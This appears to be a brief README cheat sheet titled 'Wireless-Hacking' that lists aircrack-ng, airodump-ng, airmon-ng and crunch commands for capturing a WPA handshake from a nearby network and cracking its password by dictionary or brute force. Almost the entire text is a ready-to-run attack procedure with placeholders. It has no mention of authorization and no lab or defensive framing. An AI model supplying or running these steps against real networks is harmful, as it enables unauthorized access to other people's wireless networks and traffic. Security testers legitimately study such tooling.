# Wireless-Hacking
1. Unzip the `rockyou.txt` worldlist:
```
$ cd /usr/share/wordlists
$ sudo gunzip rockyou.txt
```
2. Iddentify the network adapter, and set it up in monitor mode: 
```
$ ifconfig
$ sudo airmon-ng start <your-network-adpater>
```
3. Send packages to all near wireless connections and identify your network target:
```
$ sudo airodump-ng <your-network-adapter-monitor-mode>
```
4. Listen for handshake and exit when caught:
```
$ sudo airodump-ng --bssid <bssid> -c <channel> --write <output-file> <your-network-adapter-monitor-mode>
```
5. Crack hashed handshake:
* Dictionary attack:
```
$ sudo aircrack-ng <your-handshake-cap-file> -w <route-worldlist>
```
* Generate your dictionary:
```
$ sudo crunch <from-size-char> <to-size-char> "<char-to-use>" -t <patern-of-string> -o <output-file-txt>
```
* Brute force attack:
```
$ sudo crunch <from-size-char> <to-size-char> "<char-to-use>" -t <patern-of-string> | sudo aircrack-ng -w - -b <bssid-of-handshake> <your-handshake-cap-file>
```
6. Exit from monitor mode on network adapter:
```
$ sudo airmon-ng stop <your-network-adapter-monior-mode>
```
